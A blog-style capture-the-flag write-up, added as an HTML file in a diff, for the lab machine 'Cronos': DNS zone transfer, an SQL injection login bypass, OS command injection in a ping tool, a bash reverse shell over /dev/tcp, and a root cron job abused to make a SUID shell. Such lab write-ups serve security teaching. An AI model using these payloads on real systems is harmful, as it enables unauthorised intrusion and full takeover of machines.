@@ -1,0 +1,204 @@
+<!DOCTYPE HTML>
+<html>
+	<head>
+		<title>Writeups | bokkisec</title>
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+		<link rel="stylesheet" href="assets/css/main.css" />
+	</head>
+	<body class="is-preload">
+
+		<!-- Header -->
+			<div id="header">
+
+				<div class="top">
+
+					<!-- Logo -->
+						<div id="logo">
+							<!-- <span class="image avatar48"><img src="images/avatar.jpg" alt="" /></span> -->
+							<a href="https://bokkisec.com"><span class="icon solid fa-home"></span>bokkisec</a>
+							<p style="padding-bottom: 10px;"></p>
+							<a href=""><h1 id="title">Cronos</h1></a>
+						</div>
+
+					<!-- Nav -->
+						<nav id="nav">
+							<ul>
+								<li><a href="#enu" id="sec1-link"><span>Enumeration</span></a></li>
+								<li><a href="#foothold" id="sec2-link"><span>Foothold</span></a></li>
+								<li><a href="#privesc" id="sec3-link"><span>Privilege Escalation</span></a></li>
+							</ul>
+						</nav>
+
+				</div>
+
+				<div class="bottom">
+
+					<!-- Social Icons -->
+						<ul class="icons">
+							<li><a href="mailto:joshchung02@gmail.com" class="icon fa-envelope"><span class="label">Email</span></a></li>
+							<li><a href="https://www.linkedin.com/in/joshchung02/" class="icon brands fa-linkedin"><span class="label">LinkedIn</span></a></li>
+							<li><a href="https://github.com/bokkisec" class="icon brands fa-github"><span class="label">GitHub</span></a></li>
+						</ul>
+
+				</div>
+
+			</div>
+
+		<!-- Main -->
+			<div id="main">
+
+				<!-- Intro -->
+				<section id="top" class="one dark" style="background-image: url('images/medium.jpg')">
+					<div class="container">
+						<header>
+							<h2 style="text-align: center;">Cronos</h2>
+							<div style="text-align: center;">Published: Mar 21, 2025</div>
+							<div style="text-align: center;"><img src="images/cronos/cronos.png"></div>
+						</header>
+					</div>
+				</section>
+
+				<!-- Content -->
+					<section id="enu" class="two">
+						<div class="container">
+							<div class="content">
+								<header>
+									<h2>Enumeration</h2>
+								</header>
+
+								<h3>Scan</h3>
+								<p>
+									Starting off with a basic <code>nmap</code> scan:
+									<pre>nmap -sC -sV -oN scans/detailed.nmap 10.10.10.13</pre>
+									<img src="images/cronos/enu1.png">
+								</p>
+
+								<h3>Web</h3>
+								<p>
+									Port 80 is always a great place to start looking, but navigating to the website just shows a default Apache page.
+									<img src="images/cronos/enu2.png">
+								</p>
+								
+								<h3>DNS</h3>
+								<p>
+									Let’s see if we can pull some more useful information from the DNS server.<br>
+									Using <code>nslookup</code>, find out the name of the nameserver:
+									<pre>$ nslookup
+> server 10.10.10.13
+> 10.10.10.13</pre>
+									<img src="images/cronos/enu3.png">
+								</p>
+
+								<p>
+									Now, we can use <code>dig</code> to perform a zone transfer and look for subdomains.
+								</p>
+								<p>
+									For those of you new to this topic, <code>dig</code> is the “Domain Information Grouper”, which is a command-line tool for querying DNS servers. Using the <code>axfr</code> (Authoritative Transfer) query type requests a full DNS zone transfer. This functionality is meant for replicating DNS records between servers, but we are using it here to learn more about our target.
+									<pre>dig axfr @10.10.10.13 cronos.htb</pre>
+									<img src="images/cronos/enu4.png">
+								</p>
+								
+								<h3>Web (Again)</h3>
+								<p>
+									“admin.cronos.htb” looks the most interesting, so let’s take a look after adding it to <code>/etc/hosts</code> 
+									<img src="images/cronos/enu5.png">
+								</p>
+
+							</div>
+						</div>
+					</section>
+
+					<section id="foothold" class="two">
+						<div class="container">
+							<div class="content">
+								<header>
+									<h2>Foothold</h2>
+								</header>
+
+								<h3>SQL Injection</h3>
+								<p>
+									When greeted with a login panel without having any credentials, it’s usually a good idea to try some SQL injection, attempting to submit SQL syntax to be interpreted by the backend server.
+									In this case, one of the most basic forms of SQL Injection is successful.<br>
+									The following payload bypasses the authentication mechanism by commenting out any sort of password validation.
+									<pre>UserName: admin'-- -
+Password: AnythingWorksHere</pre>
+									<img src="images/cronos/foo1.png">
+								</p>
+
+								<h3>Custom Web App</h3>
+								<p>
+									After getting logged in, we are greeted with something that looks like a custom networking tool.
+									<img src="images/cronos/foo2.png">
+								</p>
+								<p>
+									Trying the <code>ping</code> feature, it looks like it simply runs the OS command to ping the specified IP.<br>
+									Here, I am using <code>tcpdump</code> and entering my own IP to see if it is actually working:
+									<pre>sudo tcpdump -ni tun0 icmp</pre>
+									<img src="images/cronos/foo3.png">
+								</p>
+								
+								<h3>Command Injection</h3>
+								<p>
+									Since it seems to be running an OS command, we can try some basic OS command injection payloads, and see that even the most basic ones work:
+									<pre>10.10.14.7; whoami</pre>
+									<img src="images/cronos/foo4.png">
+								</p>
+
+								<p>
+									Abusing this OS command injection, we can get a reverse shell as <code>www-data</code>
+									<pre>10.10.14.7; bash -c 'bash -i >& /dev/tcp/10.10.14.7/443 0>&1'</pre>
+									<img src="images/cronos/foo5.png">
+								</p>
+
+							</div>
+						</div>
+					</section>
+
+					<section id="privesc" class="two">
+						<div class="container">
+							<div class="content">
+
+								<header>
+									<h2>Privilege Escalation</h2>
+								</header>
+
+								<h3>Cron</h3>
+								<p>
+									Taking a look at the system-wide crontab, we see a non-default cron running as root every minute. 
+									Better yet, it’s running a PHP file owned by <code>www-data</code>
+									<img src="images/cronos/pe1.png">
+								</p>
+
+								<p>
+									Since we can overwrite the file, we can write any PHP code, move it to <code>/var/www/laravel/artisan</code>, and it will execute every minute. I will opt for getting myself a SUID shell by using the following PHP code:
+									<pre>&lt;?php system("cp /bin/bash /tmp/bokkish; chmod 4775 /tmp/bokkish") ?&gt;</pre>
+									<img src="images/cronos/pe2.png">
+								</p>
+
+							</div>
+						</div>
+					</section>
+			</div>
+
+		<!-- Footer -->
+			<div id="footer">
+
+				<!-- Copyright -->
+					<ul class="copyright">
+						<li>&copy; 2025 Joshua Chung</li><li>Design: <a href="http://html5up.net">HTML5 UP</a></li>
+					</ul>
+
+			</div>
+
+		<!-- Scripts -->
+			<script src="assets/js/jquery.min.js"></script>
+			<script src="assets/js/jquery.scrolly.min.js"></script>
+			<script src="assets/js/jquery.scrollex.min.js"></script>
+			<script src="assets/js/browser.min.js"></script>
+			<script src="assets/js/breakpoints.min.js"></script>
+			<script src="assets/js/util.js"></script>
+			<script src="assets/js/main.js"></script>
+
+	</body>
+</html>
